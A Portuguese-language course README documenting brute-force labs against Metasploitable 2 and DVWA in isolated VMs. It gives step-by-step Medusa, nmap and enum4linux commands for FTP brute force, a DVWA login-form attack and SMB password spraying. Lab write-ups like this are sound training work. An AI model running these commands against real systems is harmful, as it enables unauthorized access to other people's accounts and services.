# cibersecurity_dio_medusa
Repositório contendo o solicitado no Desafio de brute force

#  Projeto de Cibersegurança: Simulação de Ataques de Força Bruta

##  Apresentação e Visão Geral do Projeto 

Me chamo Mauro e este  é projeto prático, desenvolvido como parte do curso de Cyber segurança da DIO, foca na simulação e documentação de **ataques de força bruta** em um ambiente controlado. O objetivo é demonstrar a compreensão sobre a mecânica desses ataques, a utilização de ferramentas de auditoria como o **Kali Linux** e o **Medusa**, e a proposição de medidas de mitigação eficazes.

O ambiente de teste foi configurado com máquinas virtuais isoladas, garantindo que nenhuma atividade maliciosa fosse executada em redes reais.

## 🎯 Objetivos de Aprendizagem

*   **Compreender** a vulnerabilidade de diferentes serviços (FTP, Web, SMB) a ataques de força bruta.
*   **Dominar** a utilização do Kali Linux e da ferramenta Medusa para testes de penetração.
*   **Documentar** o processo técnico de forma clara e estruturada.
*   **Propor** recomendações de segurança para mitigar os riscos identificados.

## 🛠️ Tecnologias e Ferramentas Utilizadas

| Categoria | Ferramenta/Tecnologia | Propósito |
| :--- | :--- | :--- |
| **Sistema Operacional** | Kali Linux | Máquina atacante, ambiente de testes de penetração. |
| **Alvo Vulnerável** | Metasploitable 2 | Máquina alvo com diversas vulnerabilidades conhecidas. |
| **Alvo Web** | DVWA (Damn Vulnerable Web Application) | Aplicação web vulnerável para testes de formulário. |
| **Virtualização** | VirtualBox | Criação e gerenciamento das Máquinas Virtuais (VMs). |
| **Ataque** | Medusa | Ferramenta de força bruta para serviços de rede. |
| **Reconhecimento** | Nmap | Escaneamento de portas e serviços. |

## ⚙️ Configuração do Ambiente

O ambiente foi configurado com duas Máquinas Virtuais (VMs) no VirtualBox, utilizando uma **Rede Interna (Host-Only)** para isolamento total da rede externa.

| VM | Endereço IP (Exemplo) | Função |
| :--- | :--- | :--- |
| **Kali Linux** | `192.168.56.102` | Atacante |
| **Metasploitable 2** | `192.168.56.101` | Alvo |

## 📝 Cenários de Ataque Documentados

| Cenário | Serviço Alvo | Ferramenta Principal | Resumo do Ataque |
| :--- | :--- | :--- | :--- |
| **Cenário 1** | FTP (File Transfer Protocol) | Medusa | Força bruta tradicional (usuário fixo, múltiplas senhas). |
| **Cenário 2** | Formulário Web (DVWA) | Medusa/Hydra | Automação de tentativas de login via HTTP POST. |
| **Cenário 3** | SMB (Server Message Block) | Medusa | Password Spraying (múltiplos usuários, senha única). |


## **Cenário 1 (FTP)**

* **1- Localizando maquinas na rede.**

nmap -sV 192.168.56.0-255 

* **2- Validando possibilidade de acesso via FTP.**

ftp 192.168.56.101    

* **3- Criando wordlists para o brute force.**

echo -e 'user\nmsfadmin\nadmin\nroot' > usuarios.txt \
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt

* **4- Executando o ataque de brute force com o Medusa.** 

medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 6

* **5- Validando usuario e senha localizado no FTP.** 

ftp 192.168.56.101    


## **Cenário 2 (DVWA)**

* **6- Localizando parâmetros de acesso DVWA** 

Acesso site e localizando parâmetros via inspeção WEB

* **7- Criando wordlists para o brute force DVWA.**

echo -e 'user\nmsfadmin\nadmin\nroot' > usuariosdvwa.txt \
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhasdvwa.txt

* **8- Executando brute force no formulario de login.**

 medusa -h 192.168.56.101 -U usuariosdvwa.txt -P senhasdvwa.txt -M http \
        -m PAGE:'/dvwa/login.php' \
        -m FORM:'username=^USER^&password=^PASS^&Login=login' \
        -m 'FAIL=Login failed' -t 6

* **9- Validando credenciais localizadas**

Realizando o login no formulado da pagina DVWA.


## **Cenário 3 (SMB)**
* **10- Enumeração de usuários.** 

enum4linux -a 192.168.56.101 | tee enu4m_output.txt   

* **11- Criando wordlists para o SMB.** 

echo -e 'user\nmsfadmin\nadmin\nroot' > smb_usuarios.txt \
echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas_spray.txt

* **12- Executando ataque de password Spray** 

medusa -h 192.168.56.101 -U smb_usuarios.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

* **13- Validação de credenciais localizadas.** 
smbclient -L //192.168.56.101 -U msfadmin
